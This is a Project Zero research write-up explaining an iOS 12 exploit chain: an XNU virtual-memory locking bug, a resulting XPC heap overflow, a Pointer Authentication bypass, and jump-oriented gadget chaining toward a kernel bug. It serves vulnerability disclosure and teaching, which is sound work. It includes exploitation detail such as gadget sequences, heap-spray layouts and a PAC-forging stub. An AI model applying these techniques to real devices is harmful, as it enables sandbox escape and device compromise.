---
source: p0
source_url: https://projectzero.google/2019/04/splitting-atoms-in-xnu.html
title: "Splitting atoms in XNU - Project Zero"
description: "Posted by Ian Beer, Google Project ZeroTL;DRA locking bug in the XNU virtual memory subsystem all..."
---

Posted by Ian Beer, Google Project Zero

## TL;DR

A locking bug in the XNU virtual memory subsystem allowed violation of the preconditions required for the correctness of an optimized virtual memory operation. This was abused to create shared memory where it wasn't expected, allowing the creation of a time-of-check-time-of-use bug where one wouldn't usually exist. This was exploited to cause a heap overflow in XPC, which was used to trigger the execution of a jump-oriented payload which chained together arbitrary function calls in an unsandboxed root process, even in the presence of Apple's implementation of ARM's latest Pointer Authentication Codes (PAC) hardware mitigation. The payload opened a privileged socket and sent the file descriptor back to the sandboxed process, where it was used to trigger a kernel heap overflow only reachable from outside the sandbox.

[Exploit](https://bugs.chromium.org/p/project-zero/issues/detail?id=1728#c4) for iOS 12.0 on iPhone Xs .

# Part I: A virtual memory bug

## What's in your space?

Most operating systems maintain two data structures representing the virtual address space of processes:

- A management data-structure, which contains abstract descriptions of what every virtual memory address which is valid in a process should contain


- A hardware data-structure, typically used by a hardware [memory management unit](https://en.wikipedia.org/wiki/Memory_management_unit) to implement the virtual-to-physical address translations which happen each time memory is read or written


The management data-structures contain book-keeping information like "the 4KB region from address 0x1234000 to 0x1235000 should contain the bytes from the file /tmp/hello starting at offset 0x3000".

The hardware data-structures contain the hardware-specific implementation details of how to translate from virtual address to physical memory address; the hardware will use them at runtime to find the physical addresses which should be used for each memory access.

In XNU the management data structure is a [red-black tree](https://en.wikipedia.org/wiki/Red%E2%80%93black_tree) of vm\_map\_entry structures, contained in a struct vm\_map. There's generally one vm\_map per task. For iOS on modern iPhones the hardware data structures are ARM64 Translation Tables.

One of the major responsibilities of an OS virtual memory subsystem is to keep these data structures in sync; modifications to the high-level representation of virtual memory should be accurately reflected in the hardware data structures when required. The hardware structures are generally created lazily on demand in response to actual memory usage, and the management structures must be the ground truth representation of what a task's virtual address space should contain.

Any bugs in the maintenance of these management structures are likely to have interesting consequences.

## Copyin'

vm\_map\_copyin\_internal in vm\_map.c converts a virtual memory region from a task's vm\_map into a "copied in" form, constructing a vm\_map\_copy structure representing the copied virtual memory which can be passed around and subsequently mapped into another task's vm\_map (or mapped back into the same vm\_map which it came from.)

The function contains a while loop which iterates through each of the vm\_map\_entry structures making up the virtual memory region to be copied and tries to append a copied form of each vm\_map\_entry to a vm\_map\_copy structure.

Under certain circumstances this copy operation can be optimized into a move operation, here's a code snippet with verbatim comments describing one such case:

/\*

\*  Attempt non-blocking copy-on-write optimizations.

\*/

if (src\_destroy &&

       (src\_object == VM\_OBJECT\_NULL \|\|

         (src\_object->internal &&

          src\_object->copy\_strategy == MEMORY\_OBJECT\_COPY\_SYMMETRIC &&

          !map\_share)

        )

      )

{

    /\*

     \\* If we are destroying the source, and the object

     \\* is internal, we can move the object reference

     \\* from the source to the copy.  The copy is

     \\* copy-on-write only if the source is.

     \\* We make another reference to the object, because

     \\* destroying the source entry will deallocate it.

     \*/

    vm\_object\_reference(src\_object);

    /\*

     \\* Copy is always unwired.  vm\_map\_copy\_entry

     \\* set its wired count to zero.

     \*/

    goto CopySuccessful;

This optimization will apply if the source vm\_map\_entry represents anonymous memory (such as that returned via mach\_vm\_allocate) and the semantics of the copy operation being performed will cause that memory to be deallocated from the source vm\_map. In that case, as the comment describes, the vm\_map\_entry can be "moved" from the source vm\_map into the vm\_map\_copy structure, rather than a copy-on-write copy being created.

In practise this optimization will be encountered when a mach message is sent containing an out-of-line descriptor with the deallocate flag set. This is a low-overhead way to move large regions of virtual memory between processes, something which can happen with some frequency in XNU.

## Only mostly atomic...

The vm\_map\_entry's making up the source of the region to be moved will only be removed from the source vm\_map after they have all been copied into the vm\_map\_copy. This happens in the vm\_map\_delete call, right after the while loop:

}   // end while(true)

/\*

\\* If the source should be destroyed, do it now, since the

\\* copy was successful.

\*/

if (src\_destroy) {

    (void) vm\_map\_delete(src\_map,

                         vm\_map\_trunc\_page(src\_addr,

                                           VM\_MAP\_PAGE\_MASK(src\_map)),

                         src\_end,

                         ((src\_map == kernel\_map) ?

                           VM\_MAP\_REMOVE\_KUNWIRE :

                           VM\_MAP\_NO\_FLAGS),

                         VM\_MAP\_NULL);

In order for the move optimization to be correct it is fundamentally important that the copy and removal of the entries is performed atomically; nothing else should be able to mutate the source vm\_map while this is happening, as if it could it might also be able to perform an "optimized move" at the same time! In reality, the atomicity is easy to break :(

Above the while loop which iterates through the vm\_map\_entry's in the source region they take the source vm\_map's lock:

vm\_map\_lock(src\_map);

but looking down the code for calls to vm\_map\_unlock we find this (again, the comment is verbatim from the source) :

/\*

\*  Create a new address map entry to hold the result.

\*  Fill in the fields from the appropriate source entries.

\*  We must unlock the source map to do this if we need

\*  to allocate a map entry.

\*/

if (new\_entry == VM\_MAP\_ENTRY\_NULL) {

    version.main\_timestamp = src\_map->timestamp;

vm\_map\_unlock(src\_map);

    new\_entry =

      vm\_map\_copy\_entry\_create(copy,

      !copy->cpy\_hdr.entries\_pageable);

vm\_map\_lock(src\_map);

    if ((version.main\_timestamp + 1) != src\_map->timestamp) {

      if (!vm\_map\_lookup\_entry(src\_map,

                               src\_start,

                               &tmp\_entry))

      {

          RETURN(KERN\_INVALID\_ADDRESS);

      }

      if (!tmp\_entry->is\_sub\_map)

        vm\_map\_clip\_start(src\_map, tmp\_entry, src\_start);

      continue; /\* restart w/ new tmp\_entry \*/

}

We'll hit this path if the region being copied is comprised of more than one vm\_map\_entry, since we allocate the first vm\_map\_entry for new\_entry before initially taking the src\_map lock.

Quickly dropping a very important lock and retaking it is a common anti-pattern I've observed across the XNU codebase; I'm sure this isn't the only instance of it. In this case this is presumably a hack because vm\_map\_copy\_entry\_create may in some cases need to take a vm\_map lock.

After reacquiring the src\_map lock they perform the following check:

if ((version.main\_timestamp + 1) != src\_map->timestamp)

The vm\_maptimestamp field is a 32-bit value incremented each time the map is unlocked:

#define vm\_map\_unlock(map)\

    ((map)->timestamp++ , lck\_rw\_done(&(map)->lock))

This is trying to detect whether another thread acquired and dropped the lock while this thread dropped it then reacquired it. If so, the code checks whether there's still a vm\_map\_entry covering the current address its trying to copy and then bails out and looks up the entry again.

The problem is that this check isn't sufficient to ensure the atomicity of the optimized copy; just because there's still a vm\_map\_entry covering this address doesn't mean that while the lock was dropped another thread didn't start its own optimized move operation.

The entries which have previously been appended to the vm\_map\_copy aren't also invalidated, meaning the atomicity of the optimization can't be guaranteed.

The locking is insufficient to prevent two threads concurrently believing they are performing atomic vm\_map\_entry move operations on the same vm\_map\_entry.

## Overlap

Triggering the issue requires us to create two threads, each of which will attempt to perform the move optimization at the same time. If we create a large virtual memory region consisting of alternating anonymous memory entries and memory object entries, we can ensure that copies of the region will require multiple iterations of the vm\_map\_copy building loop which contains the bad locking primitive. I chose to structure the region as shown in the diagram below, where two out-of-line descriptors consisting of alternating mapping types overlap by one anonymous memory entry. It is this entry to which we want to have the move optimization applied twice, meaning it will appear in two vm\_map\_copy lists, each believing it has also been atomically removed from the source address space:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSXYS_w640-h162_image3.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSXYS_s621_image3.png)

By sending one of these out-of-line descriptors to another process via a mach message, and one to ourselves, we will inadvertently create shared memory! This means that once both processes have received the mach messages the sender's writes to the anonymous page are reflected in the target's address space, something which violates the semantics of mach messages.

## build-your-own-bug with virtual memory issues

In 2017 lokihardt found [CVE-2017-2456](https://bugs.chromium.org/p/project-zero/issues/detail?id=1083), a similar style of issue involving out-of-line descriptors being backed by shared memory. He found that this could be turned into a heap overflow in libxpc when it parses an XPC dictionary. Specifically, libxpc will call strlen on a buffer in the now-shared memory, use that length plus one to allocate a buffer, then call strcpy to fill the buffer. The strcpy will copy until it finds a NULL byte, unaware of the size of the destination buffer.

By itself such code does not have a bug, because the semantics of mach messages imply that received out-of-line descriptors cannot be modified by the sender. But, if due to a virtual memory bug, the memory is actually shared then this code has a time-of-check-time-of-use "bug."

We'll use this same primitive to build a controlled heap overflow primitive with which we can target any XPC service. I used the custom XPC serialization library I wrote for [triple\_fetch](https://bugs.chromium.org/p/project-zero/issues/detail?id=1247). For more details [check out the exploit](https://bugs.chromium.org/p/project-zero/issues/detail?id=1728#c4). From here on we'll assume we can groom the heap using XPC and cause a heap overflow with non-null bytes during deserialization of an XPC dictionary.

# Part II: Escaping userspace sandboxes with PAC

Apple's latest A12 system-on-a-chip is the first widely deployed implementation of ARMv8.3's Pointer Authentication Codes feature, commonly referred to as PAC. For a deep-dive into PAC internals check out [Brandon Azad](https://twitter.com/_bazad)'s [prior work](https://projectzero.google/2019/02/examining-pointer-authentication-on.html). In this section I'll explore PAC's impact on the exploitation of memory corruption bugs in the context of a userspace sandbox escape. For a more technical overview read section D5.1.5 of the ARM manual.

## unPACking Pointer Authentication Codes

PAC introduces a new set of instructions which treat some of the higher bits of a 64-bit value as an "authentication code" field. There are instructions to add, validate and remove authentication codes, with the intended use case being to add these authentication codes into pointers stored in memory. The idea is that an attacker now has to be able to guess, forge or leak a valid authentication code if they wish to corrupt a pointer and have that pointer used by the target process. Let's take a closer look:

Pointers

In iOS userspace pointer authentication codes are 16 bits wide, occupying the bits above the 39-bit userspace virtual address space:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpZEK_w640-h106_image5.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpZEK_s624_image5.png)

A pointer without an authentication code might look like this:

0x000000019219816c

And that same pointer with an authentication code might look like this:

0x001f32819219816c

(Note that the highlighting there isn't aligned on a 39-bit boundary, the code actually begins at the high bit of the 8.)

The lower 39 bits of the pointer with the authentication code match the same bits in the pointer without the code. The pointer containing the code can't be dereferenced; it's outside the valid address space (unless the code were all zeros.) Instead, ARMv8.3 provides instructions to remove and verify the code. If the verification fails then the hardware will flip a high bit in the resulting pointer, causing it to become invalid. It's only when code attempts to dereference such a pointer that an address translation exception will occur; a PAC code verification failure by itself doesn't cause an exception.

Contexts

The authentication code is derived from three sources: a key, a value to be authenticated (the pointer), and a 64-bit context value. It's this context value which enables many of the more interesting applications of PAC. For example, a pointer's PAC can be created using the address of the pointer itself, meaning that even if a PAC'ed pointer could be disclosed to an attacker, it would only be valid were it reused at the same address. In many cases, however the context value is zero, and PAC provides convenience instructions for specifying a zero context value.

Keys

The kernel manages five keys, grouped into three data types (instruction, data and general) and two key families (A and B). In iOS userspace the A-family keys are shared between all processes and the B-family keys are unique per-process. Userspace cannot read or write these keys, they are controlled by EL1 (the kernel) and used implicitly by the PAC instructions.

Instructions

Section C3.1.9 of the ARM manual describes all the new pointer authentication instructions. They fall into four categories:

PAC\* : add an authentication code to a value

AUT\* : authenticate a value containing an authentication code

XPAC\* : remove an authentication code without validation

COMBINATION : combine one of the above PAC operations with another instruction

Let's look at PACIA. The I and A tell us which key this instruction uses (the A-family Instruction key.) PACIA has two operands:

PACIA <Xd>, <Xn\|SP>

Xd is the register containing the pointer which should have an authentication code added to it. Xn\|SP is the register containing the context value which should be used in combination with the A-family instruction key to generate the authentication code, which can be a general-purpose register or the SP register.

There are many variants of the PAC\* instructions for using different keys and specific context values, for example:

PACIZA <Xd> : use zero as the context value for creating an authentication code for register Xd with A-family instruction key

PACDZB <Xd> : use zero as the context value for creating an authentication code for register Xd with B-family data key

PACIBSP : add an authentication code to X30 (the link register, containing the return address from a function call) using SP as the context value and the B-family instruction key

There are similar variations for the AUT\* instructions, which perform the inverse verification operation to their PAC\* counterparts:

AUTIA <Xd>, <Xn\|SP>

Here Xd is the register containing the pointer with an authentication code to be validated. Xn\|SP is the register containing the context value; in order for the authentication to succeed the context value passed here must match the value provided when the authentication code was added. This variant will use the A-family instruction key. If the authentication code matches, it is stripped from register Xd such that the register contains the original raw pointer.

If the authentication code doesn't match (because either the pointer value is incorrect, the authentication code is incorrect, the context value is incorrect or the key is different) then the code is still stripped from register Xd but a high bit is then flipped in Xd such that any subsequent dereference of the pointer would cause an address translation exception.

AUTIZA, AUTDZB, AUTIBSP and so on perform the inverse authentication operation to their PAC\* counterparts.

The XPAC\* instructions remove the PAC bits from a pointer without verifying the code.

The combination instructions provide simple primitives for using PAC to perform one of four common operations:

B(L)RA\* : branch (and link) with authentication

RETA\* : return with authentication

ERETA\* : return across exception level with authentication

LDRA\* : load from address with authentication

These instructions also support using various keys and fixed or particular context values, for example:

RETAB: use SP (the stack pointer) as the context value to authenticate LR (the link register) using the B-family instruction key and if authentication is successful continue execution at the authenticated LR value, but don't write the authenticated value back to LR.

BLRAAZ <Xn> : use zero as the context value to authenticate the contents of register Xn using the A-family instruction key. If authentication is successful, continue execution at the authenticated Xn address and store PC+4 into LR (the link register) but don't write the authenticated value of Xn back.

## PAC primitives

In iOS 12 on A12 devices there is some compiler support to use some of the new PAC instructions to build new security primitives.

For example: as a mitigation against return-oriented-programming (ROP) function prologues and epilogues have changed from looking like this:

SUB      SP, SP, #0x20

STP      FP, LR, \[SP,#0x10\]

ADD      FP, SP, #0x10

...

LDP      FP, LR, \[SP,#0x10\]

ADD      SP, SP, #0x20 ; ' '

RET

to looking like this:

PACIBSP

SUB      SP, SP, #0x20

STP      FP, LR, \[SP,#0x10\]

ADD      FP, SP, #0x10

...

LDP      FP, LR, \[SP,#0x10\]

ADD      SP, SP, #0x20 ; ' '

RETAB

PACIBSP uses the value of SP at the function entry point as the context value to add an authentication code using the B-family instruction key to LR (the link register, containing the return address.) LR is then spilled to the stack. At the end of the function, when SP should be equal to its value when the function was entered, RETAB uses SP as the context value again to verify LR's authentication code after loading it from the stack. If LR's code is valid, then execution continues at that address.

What does this mean in practice? Since the B-family keys are unique per-process on iOS it means that from another process we cannot forge a fake return address which would pass the authentication check in RETAB by running the PACIBSP instruction ourselves. In addition, the use of SP as the context value means that even if we had the ability to disclose stack memory we would only be able to reuse authenticated pointers when the value of SP matches. It's important to observe here that this just breaks a particular technique commonly seen in public exploits; whether use of that technique is a necessary part of exploitation is another question.

In general, almost all function pointers are now somehow making use of PAC: weakly protected pointers use an A-family key and a zero context value, while strongly protected pointers use a B-family key with a non-zero context derived from some runtime value.

## Necessary compromises...

The per-process B-family keys are only used in a handful of situations. The more common use of A-family shared keys is a necessary compromise. Consider the pages of memory containing C++ vtables in shared libraries. These pages are copy-on-write shared between processes. If each pointer in each vtable contained an B-family authentication code, then these pages could no longer be copy-on-write shared between all processes, as each process would have unique vtables. This would introduce an extreme memory and performance overhead as much of the shared cache would have to be copied and "reauthenticated" each time a new process were created.

The use of the B-family keys for ROP mitigation is possible because a stack frame is never shared between processes (unless you're doing something really weird...). For other possible uses of PAC it's much harder to assert that a particular pointer will never escape the confines of a particular process, even in a COW way.

## Exploiting memory corruption in the presence of PAC

The attack scenario is important to consider when discussing exploitation and mitigations. The exploit I describe here assumes the attacker already has native code execution of some sort. Although the proof-of-concept exploit provided is a "malicious app", that is only one possible scenario. Similar primitives to those used by this exploit could also be implemented from a Safari WebContext exploit able to write shellcode to JIT memory, or even with only an arbitrary read/write primitive and an A-family PAC signing oracle.

(There is some usage of PAC in JavaScriptCore on A12 to try to provide some integrity while native code is being emitted; bypassing this is left as an exercise for the reader ;) )

Given these attack scenarios, we can assume that an attacker is able to forge PAC codes which use A-family keys. Since these keys are shared between all processes, if we execute an instruction like PACIA in our attacker process, the resulting PAC code will also be valid for identical inputs in another process.

New Mitigations; New Primitives

Using the atomicity bug, we've built a heap corruption primitive targeting libxpc which we can trigger by sending an XPC dictionary to a target.

In my [triple\_fetch](https://bugs.chromium.org/p/project-zero/issues/detail?id=1247) exploit from 2017, which also targeted a bug in libxpc, I corrupted an objective-C object's isa pointer. From there you get control of the selector cache and from there complete control of PC when a selector is called.

On A12 devices, the objective-C selector cache now uses the B-family instruction key to authenticate entries in the selector cache:

\_objc\_msgSend:

...

LDP   X17, X9, \[X12\] ; X12 points into selector cache

                       ; X17 := fptr

; X9  := selector ptr

CMP   X9, X1         ; does the cached selector ptr match?

B.NE  no\_match       ; no? try next one if more entries, otherwise:

EOR   X12, X12, X1   ; XOR the selector pointer into the context ;)

BRAB  X17, X12       ; yes? Branch With Authentication

                       ;      using B-family Instruction key

                       ;      and selector cache entry address

                       ;      as context

(The selector XOR is a recent addition to prevent an authenticated function pointer being reused for a different selector but in the same cache slot)

Without the ability to forge or disclose B-family authenticated pointers we can't simply point to a fake selector cache. This breaks the fake selector cache technique.

The trick I'm using here is that while the selector cache entries are "tied" to a particular cache by PAC, the isa pointers (which point to the objective-C class object) are not tied to particular objects. An objective-C object still has a "raw" isa class pointer as its first 8 bytes. This means we can still use a memory corruption primitive to replace an object's isa pointer with another type's isa pointer, allowing us to create a type confusion. We then just need to find a suitable replacement type such that an A-family authenticated function pointer will be read from it and called, as opposed to a fake selector cache. Since we can forge A-family authenticated pointers this will give us initial PC control.

As a place to start I began looking through the various implementations of XPC object destruction in libxpc. These are the methods with names like \_\_xpc\_TYPE\_dispose, called when xpc objects are freed.

For example, here's a snippet from \_\_xpc\_pipe\_deserialize:

PACIBSP

STP      X20, X19, \[SP,#-0x10+var\_10\]!

STP      X29, X30, \[SP,#0x10+var\_s0\]

ADD      X29, SP, #0x10

MOV      X19, X0

LDR      W0, \[X19,#0x24\] ; name

CBZ      W0, loc\_180AFFED0

BL       \_\_xpc\_mach\_port\_release

We could use the isa overwrite technique to craft a fake xpc\_pipe object such that this method would be called and we could cause an arbitrary mach port name to be passed to mach\_port\_deallocate. You could then use techniques such as that which I used in [mach\_portal](https://bugs.chromium.org/p/project-zero/issues/detail?id=965#c2), or Brandon Azad used in [blanket](https://bazad.github.io/presentations/beVX-2018-Crashing-to-root.pdf) to impersonate an arbitrary mach service.

Note that for that we wouldn't need to forge any PAC authenticated pointers.

Instead we're deliberately going to get PC control, so we need to read more methods. Here's the start of \_\_xpc\_file\_transfer\_dispose:

PACIBSP

STP      X20, X19, \[SP,#-0x10+var\_10\]!

STP      X29, X30, \[SP,#0x10+var\_s0\]

ADD      X29, SP, #0x10

MOV      X19, X0

LDR      W8, \[X19,#0x58\]

CMP      W8, #1

B.EQ     loc\_180B06CDC

LDR      X0, \[X19,#0x40\] ; aBlock

CBZ      X0, loc\_180B06C70

BL       \_\_Block\_release\_0

If the qword at X0+0x40 is non-zero it will be passed to \_Block\_release, which is part of the open-source libclosure package:

void \_Block\_release(const void \*arg) {

struct Block\_layout \*aBlock = (struct Block\_layout \*)arg;

if (!aBlock) return;

if (aBlock->flags & BLOCK\_IS\_GLOBAL) return;

if (! (aBlock->flags & BLOCK\_NEEDS\_FREE)) return;

if (latching\_decr\_int\_should\_deallocate(&aBlock->flags)) {

    \_Block\_call\_dispose\_helper(aBlock);

    \_Block\_destructInstance(aBlock);

    free(aBlock);

}

}

Here we can see the argument is actually a Block\_layout structure. The code checks some flags, then decrements a reference count. If it decides that the object should be freed it calls \_Block\_call\_dispose\_helper:

static void \_Block\_call\_dispose\_helper(struct Block\_layout \*aBlock)

{

struct Block\_descriptor\_2 \*desc = \_Block\_descriptor\_2(aBlock);

if (!desc) return;

(\*desc->dispose)(aBlock);

}

This clearly calls a function pointer from the block structure. Let's look at this in assembly, here from 12.0:

LDR     X8, \[X19,#0x18\] ; read the Block\_descriptor\_2 pointer from

                          ;   +0x18 in the block

LDR     X9, \[X8,#0x18\]! ; bump that pointer up by 0x18 and load the

                          ;   value there into x8

AUTIA   X9, X8          ; authenticate X9 using A-family instruction

                          ;   key and X8 (the address the pointer was

                          ;   read from) as context

PACIZA  X9              ; add a new PAC code to the function pointer

                          ;   using A-family instruction key and a

                          ;   zero context

MOV     X0, X19         ; pass the block as the first argument

BLRAAZ  X9              ; branch with link register and authenticate

                          ;   using A-family instruction key and

                          ;   zero context

(this code has changed slightly in later versions but the functionality we're using remains the same)

This gives us a path from corrupting an objective-C object pointer to PC control which doesn't involve any B-family keys. A prerequisite is that we can place known data at a known location, since we will need to forge the context value here:

AUTIA   X9, X8

which is the address from which X9 was read. For this I'm using the same mach\_msg OOL\_DESCRIPTOR spray technique which continues to work on iOS 12. Note that the memory overhead for this is very low, as we are actually just sending multiple copies of the same anonymous region for the spray.

Putting those steps together, our strategy looks like this:

Build an XPC dictionary (inside a region of memory which we can target with the non-atomic copy when we send it) which grooms the heap such that we can land the bad strcpy buffer right before an xpc array backing buffer. Trigger the non-atomic move bug such that we can continue to write to the serialized XPC dictionary while the target process is deserializing it, and use that to cause the bad strcpy, overflowing into the first pointer in the xpc array backing buffer.

Point that to a crafted XPC object contained in the OOL\_DESCRIPTOR heap spray which has an xpc\_file\_transfer isa pointer as its first member. When the xpc array is destroyed \_\_xpc\_file\_transfer\_dispose will be called which will follow a controlled pointer chain to call an A-family authenticated function pointer.

This diagram shows the layout in the attacker's address space of the XPC dictionary inside the non-atomic region:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjb3t6_w640-h246_image4.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjb3t6_s622_image4.png)

The XPC dictionary contains duplicate keys which it uses as a primitive for grooming the heap and making holes. It attempts to groom a layout similar to this:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0p9L_w640-h166_image2.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0p9L_s624_image2.png)

If everything goes to plan by flipping the flipper byte in the sender process we can race the strlen;malloc;strcpy in the XPC deserialization code such that the target first sees a short string (the length of the undersized strcpy dest buffer, which malloc should slot right before the target xpc\_array backing buffer if the groom worked) then the null byte is replaced by a non-null byte when read by strcpy meaning the copy will proceed off the end of the undersized strcpy dest buffer and corrupt the first entry in the xpc\_array's backing buffer, which is an array of pointers (or tagged pointers) to xpc objects.

We corrupt the first pointer to instead point to a fake xpc\_file\_transfer object in the heapspray which we try to place at 0x120200120:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_6lQ_w568-h640_image1.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_6lQ_s587_image1.png)

When the xpc\_array containing the now-corrupted pointer is released it will release each of the entries in the array, causing the fake OS\_xpc\_file\_transfer isa to be read leading to 0x120200120 being passed as the first (self) argument to \_\_xpc\_file\_transfer\_dispose. This code reads the fake block pointer at 0x120200160, then reads the fake descriptor pointer at 0x1202000018 and finally performs a PAC authentication on the pointer read from 0x120200098 using the A-family instruction key and the address of the pointer as the context.

The exploit uses a small assembly stub to allow us to forge a valid pointer here:

.globl  \_pacia

.align  2

\_pacia:

    pacia x0, x1

    ret

Filling our heapspray memory with a repeated page containing such a structure we can gain PC control :)

## goto 10

Previously I might have looked to point the initial PC value to a stack pivot, allowing the chaining together of ROP gadgets by popping fake stack frames. The issue now, as we saw earlier, is that even if we gain control of the stack pointer the spilled LR values (return addresses) are authenticated with the B-family instruction key and the stack pointer as context. This means we can't forge them from our attacking process.

Again, as with the selector cache, this is just a mitigation against a particular technique, not something which is fundamentally required for exploitation.

The end goal here is to be able to move from controlling PC once to controlling it repeatedly, ideally with arbitrary, controlled values in a few argument registers so we can chain arbitrary function calls. Really nice to have would be the ability to pass return values from one arbitrary function call as an argument to a later one.

Techniques which achieve functionality like this are sometimes referred to as JOP (Jump-Oriented-Programming) which is now used as a catch-all term for all techniques which chain together multiple PC controls without using the stack. All the gadgets I use here were found manually just with a few regexs in IDA Pro.

The first type of gadget I wanted was something which would call a function pointer in a loop, with some change in arguments each time. Since libxpc was already loaded into IDA, that's where I started looking. Here's a screenshot from IDA of \_xpc\_array\_apply\_f (it's easier to see the loop structure in the graph view:)

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSj8c_w388-h640_image6.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSj8c_s1380_image6.png)

This looks like a good loop primitive. The intended functionality here is to pass each element of an xpc\_array to the function pointer supplied in X2. If we can reach here with a controlled value in X0 (a fake xpc\_array) and X2 (function pointer), we can get the function pointer called in a loop with a different, controlled value in X1 each time. Specifically it's going to read a length value from the fake xpc\_array+0x18 then call the function pointer repeatedly passing each element from the fake xpc\_array backing buffer pointed to by X0+0x20 as X1 each time.

## Gadget Collection

We need a few gadgets either side of this loop primitive. When we first get PC control X19 points to the base of the heap spray. We need to get from there to control of PC, X0 and X2 in order to use the loop gadget.

This instruction sequence inside libc++ gets us from X19 to X0, X1 and PC again:

18004816C:

LDP    X0, X1, \[X19,#0x48\]   ; load X0 from \[X19+0x48\] and

                               ;      X1 from \[X19+0x50\]

LDR    X8, \[X0\]              ; X0 is supposed to be a C++ object

                               ; pointer, so read the vtable pointer

LDRAA  X9, \[X8,#0x28\]!       ; authenticate X8 (the vtable pointer)

                               ; with a zero context value and

                               ; A-family data key. Add 0x28 to the

                               ; authenticated vtable pointer and read

                               ; the function pointer there into X9

                               ; then write the target address back

                               ; into X8 (so X8 points to the function

                               ; pointer in the vtable)

MOVK   X8, #0xD96D,LSL#48    ; load the high 16-bits of X8 with a

                               ; constant representing a type-tag for

                               ; the inheritance hierarchy expected

                               ; at this callsite

ADD    X2, SP, #0x50+var\_40

ADD    X4, SP, #0x50+var\_48

MOV    X3, X20

BLRAA  X9, X8                ; branch and link with authentication

                               ; using A-family instruction key and X8

                               ; (address of vtable function pointer

                               ; \| (type\_tag << 48)

To use that we need to forge two uses of PAC A-family keys, which we can do. Note that each of these gadgets end by calling function pointers read from memory which we control. This is how we are able to link them together.

To reach our loop primitive we need to control X2 as well as X0, which we can get by chaining this sequence next:

18082B660:

MOV     X22, X1

MOV     X19, X0

STR     X22, \[SP,#0x50+var\_48\]

MOV     W24, #0x16

CBZ     X19, loc\_18082BB3C

CBZ     X22, loc\_18082BB3C

LDR     X8, \[X19,#0x18\]

CBZ     X8, loc\_18082B698

LDR     X2, \[X19,#0xC8\]

ADD     X1, SP, #0x50+var\_48

MOV     X0, X22

BLRAAZ  X8

This also calls through a function pointer which uses PAC, but still an A-family key (with a zero context) which we can easily forge.

By pointing the fake xpc\_array object into the heap spray we can now repeatedly get the same function pointer called with a different value in X1 each time. We now want to find a gadget which lets us turn that into a more controlled arbitrary function call primitive. Again we can reused some intended functionality.

I stumbled across IODispatchCalloutFromCFMessage a while ago while reading IOKit code; it's used under the hood to power asynchronous notification callbacks in IOKit. The userspace process receives messages on a mach port receive right it owns, and from the message reads a function pointer and arguments then calls the function pointer with those arguments. I had filed it away as a potential exploitation technique for a mach port name management bug, but it also provides a nice primitive for this exploit.

The method signature is this:

void

IODispatchCalloutFromCFMessage(CFMachPortRef port \_\_unused,

                               void \*\_msg,

                               CFIndex size \_\_unused,

                               void \*info \_\_unused)

Note that all arguments apart from \_msg are unused, so only X1 control is required to use this method. The function pointer to call (authenticated with the A-family instruction key and zero context) and the parameter are read from the \_msg pointer. There are some constraints: you can only pass four arguments, and the second one can only be 32-bits, but this is enough to start with.

If we set IODispatchCalloutFromCFMessage as the function pointer argument to \_xpc\_array\_apply and make each element of the fake xpc\_array be a pointer to a fake mach message matching the format expected by IODispatchCalloutFromCFMessage then we can chain together an arbitrary number of basic function calls.

There are a few more gadget primitives which make writing a full payload easier:

retcapture

The prototype of IODispatchCalloutFromCFMessage says its return type is void, and reading the assembly we can see that actually the return value (X0) from the function pointer it calls will survive in X0 through to the end of IODispatchCalloutFromCFMessage, meaning in practice IODispatchCalloutFromCFMessage returns the values returned by the called function pointer. This means we can wrap IODispatchCalloutFromCFMessage in another gadget which calls a controlled function with a controlled value in X1 and then writes that return value to a memory address we control.

A bit of searching finds this inside libsystem\_trace:

PACIBSP

STP      X20, X19, \[SP,#-0x10+var\_10\]!

STP      X29, X30, \[SP,#0x10+var\_s0\]

ADD      X29, SP, #0x10

MOV      X19, X0

LDP      X8, X1, \[X19,#0x28\]

LDR      X0, \[X8,#0x18\]

MOV      X8, X0

LDR      X9, \[X8,#0x10\]!

BLRAA    X9, X8

LDR      X8, \[X19,#0x20\]

LDR      X8, \[X8,#8\]

STR      X0, \[X8,#0x18\]

LDP      X29, X30, \[SP,#0x10+var\_s0\]

LDP      X20, X19, \[SP+0x10+var\_10\],#0x20

RETAB

This method takes a single argument from which, through a series of dereferences, it reads a function pointer to call as well as the X1 argument to pass. It calls the function pointer then writes the return value from the call into an address read from the input argument.

If we use the initial arbitrary call gadget to call this, passing the required descriptor in X1, we can use this to call the arbitrary call gadget again, but now the return value from that inner call will be written to a controlled memory address.

By carefully choosing that memory address to overlap with the argument descriptors for later calls we can pass the return value from one arbitrary call as an argument to a later call.

memory\_copy

LDR    X9, \[X0\]

STR    X9, \[X3\]

B      end

end:

MOV    X0, X8

RET

This gadget can be called using the arbitrary call gadget to read a 64-bit value from a controlled address and write it to another controlled address.

indirect\_add

LDR    X8, \[X0, #0x18\]

ADD    X8, X8, X1

STR    X8, \[X3\]

MOV    W0, #0x0

RET

This gadget can also be called using the arbitrary call gadget and can be used to add an arbitrary value to a value read from a controlled memory address, and write that sum back to memory.

The exploit contains various macros which seek to aid combining these primitives into useful payloads. It might seem like this is quite a limited set of primitives, so let's demonstrate a practical use by building a payload to open a PF\_KEY socket in the target process and smuggle it back to ourselves so we can trigger CVE-2019-6213, a kernel heap overflow not reachable from inside the app sandbox.

## Stealing sock(et)s

